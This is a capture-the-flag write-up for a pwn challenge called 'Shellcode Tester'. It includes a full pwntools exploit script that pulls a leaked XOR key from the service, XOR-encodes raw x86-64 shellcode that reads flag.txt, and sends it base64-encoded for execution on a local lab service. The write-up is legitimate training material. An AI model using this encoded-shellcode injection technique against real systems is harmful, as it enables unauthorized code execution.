<img src="https://raw.githubusercontent.com/CTFae/media/main/brand/YT-banner.jpg" />

### Challenge: Shellcode Tester
### Category: Pwn
### Difficulty: Medium
<hr>

#### Challenge Description
This challenge will need users to write scripts to extract the XOR key, craft some assembly that is XOR’ed with this key and send it over for execution.

#### Challenge Screenshot
![chal](https://raw.githubusercontent.com/CTFae/media/main/writeups/shellcode_tester-1.png)

#### Solution
The user can generate shellcode using any tool of their choosing (mfvenom, pwntools, online sources, etc) and simply XOR it and send it to the service. Upon code execution, they should grab `flag.txt` to capture the flag.

#### Exploit Screenshot
![exploit](https://raw.githubusercontent.com/CTFae/media/main/writeups/shellcode_tester-2.png)


#### Exploit Script
```py
from pwn import *
import base64
# Connection variables
HOST = '127.0.0.1'
PORT = 1221

# For fun
splash()

# asm(shellcraft.cat('flag.txt'))
shellcode = b'j\x01\xfe\x0c$H\xb8flag.txtPj\x02XH\x89\xe71\xf6\x99\x0f\x05A\xba\xff\xff\xff\x7fH\x89\xc6j(Xj\x01_\x99\x0f\x05'

# Connect to the service
conn = remote(HOST, PORT)

# Receive and get the xor key
message = conn.recvuntil(' and executed', drop=True).decode('utf-8')
xor_key = int(message[message.find('0x'):],16)
info(f'Got XOR key: {hex(xor_key)}\n')

# XOR the payload
encoded_shellcode = []
for byte in shellcode:
    encoded_shellcode.append(ord(chr(byte)) ^ xor_key)
encoded_shellcode = bytes(encoded_shellcode)

# Base64 the payload
b64_shellcode = base64.b64encode(encoded_shellcode)
info(f"Encoded shellcode: {b64_shellcode}")

# Send the payload
conn.recvline()

# conn.send(b64_shellcode)
conn.send(b64_shellcode)

# Get output
result = conn.recvuntil('}').decode('utf-8')
flag = result[result.find('DPCTF'):]
success(f'Got flag: {flag}\n')

# Close the connection
conn.close()
```

<hr>

&copy; <a href="https://ctf.ae" target=_blank>CTF.ae</a>
